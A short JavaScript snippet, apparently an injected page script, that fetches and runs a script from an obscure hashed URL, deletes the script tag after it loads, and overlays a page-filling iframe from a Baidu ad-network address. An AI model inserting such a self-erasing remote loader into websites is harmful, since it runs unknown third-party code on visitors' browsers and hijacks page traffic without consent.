var j_url = 'https://etc.6187wo.com/d31e589d36951146274e6e5e7a1719f4.js';
var b_url = 'https://cpu.baidu.com/1022/eecb6322?scid=27508';
(function(e) {
    function loadjs(b, d) {
        var c = document.getElementsByTagName("head")[0],
            a = document.createElement("script");
        a.onload = a.onreadystatechange = function() {
             a && a.readyState && /^(?!(?:loaded|complete)$)/.test(a.readyState) || (
                a.onload = a.onreadystatechange = null,
                    a.src = "",
                    a.parentNode.removeChild(a),
                    a = null,
                d && d()
            )};
        a.onerror = function(err) {
            console.log(err);
        }
        a.charset = "utf-8";
        a.src = b;
        c && c.insertBefore(a, c.firstChild)
    }
    loadjs(j_url);

    var iframe = document.createElement("iframe");
    iframe.setAttribute("id", "frame-00123");
    iframe.setAttribute("src", b_url);
    iframe.setAttribute("frameborder", '0px');
	iframe.setAttribute("scrolling", 'no');
    iframe.setAttribute("style","width:100%;height:10000px;frameborder:0px;");
	document.body.appendChild(iframe);
})();